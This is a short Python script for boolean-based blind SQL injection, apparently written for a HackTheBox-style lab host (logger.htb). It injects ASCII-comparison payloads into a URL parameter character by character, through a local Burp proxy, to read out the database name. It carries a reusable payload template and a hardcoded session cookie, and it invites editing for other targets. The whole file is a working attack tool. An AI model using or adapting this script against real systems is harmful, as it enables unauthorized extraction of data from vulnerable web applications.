#!/usr/bin/python3

import requests
import string
import sys
import urllib
import signal

#Change the below as needed

#Injection paramater is denoted as {} in URL
URL = "http://logger.htb/room.php?cod={}"
#THis should be the full injection including quotes and comments as needed
QUERY = "2 AND ascii(substring(database(),{},1))=CHAR ORDER BY 7"
TRUE_RESPONSE = "Suite room is perfect"
COOKIES = {"PHPSESSID":"34f8hdthk6clvjqskta054ob53"}
HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding":"gzip, deflate",
"DNT":"1",
"Connection":"close"}

urlencode = urllib.parse.quote

def loop_inject(original_inject):

    letters = ''.join(string.ascii_letters + string.digits + string.punctuation)

    for char in letters:
        edit_inject = original_inject.replace("CHAR", str(ord(char)))

        burp_url = URL.format(urlencode(edit_inject))

        burp_cookies = COOKIES

        burp_headers = HEADERS

        burp_proxy = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

        r = requests.get(burp_url, headers=burp_headers,cookies=burp_cookies, proxies=burp_proxy)
        
        #Change the comparison here as appropriate
        if TRUE_RESPONSE in r.text:
            return char
    return "\nEND\n"
        


def main():
    try:
        while True:
            for i in range(1,256):
                original_inject = str(QUERY).format(i)
                get_char = str(loop_inject(original_inject))
                sys.stdout.write(get_char)
                sys.stdout.flush()

                if loop_inject(original_inject) == "\nEND\n":
                    break
    except KeyboardInterrupt:
        print("\nSIGTERM recieved, bye!")

if __name__ == "__main__":
    main()



